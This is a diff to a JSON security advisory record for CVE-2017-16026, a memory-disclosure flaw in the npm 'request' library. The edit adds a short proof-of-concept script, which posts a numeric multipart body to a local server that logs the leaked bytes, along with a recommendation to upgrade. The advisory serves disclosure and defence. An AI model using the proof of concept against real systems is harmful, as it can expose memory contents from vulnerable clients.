@@ -27,12 +27,12 @@
         "Value": "CVE-2017-16026"
       }
     ],
-    "Description": "Affected versions of request will disclose local system memory to remote systems in certain circumstances. When a multipart request is made, and the type of body is number, then a buffer of that size will be allocated and sent to the remote server as the body.",
+    "Description": "Affected versions of `request` will disclose local system memory to remote systems in certain circumstances. When a multipart request is made, and the type of `body` is `number`, then a buffer of that size will be allocated and sent to the remote server as the body.\n\n## Proof of Concept\n\n```\nvar request = require('request');\nvar http = require('http');\n\nvar serveFunction = function (req, res){\n\treq.on('data', function (data) {\n            console.log(data)\n        });\n\tres.end();\n};\nvar server = http.createServer(serveFunction);\nserver.listen(8000);\n\nrequest({\n\tmethod: \"POST\",\n\turi: 'http://localhost:8000',\n\tmultipart: [{body:500}]\n},function(err,res,body){});\n```\n\n\n## Recommendation\n\nUpdate to version 2.68.0 or later\n",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2018-11-09T17:44:01Z",
     "Severity": "MODERATE",
-    "Summary": "Moderate severity vulnerability that affects request",
-    "UpdatedAt": "2019-07-03T21:02:05Z",
+    "Summary": "Remote Memory Exposure in request",
+    "UpdatedAt": "2020-08-31T18:18:46Z",
     "WithdrawnAt": ""
   },
   "Versions": [
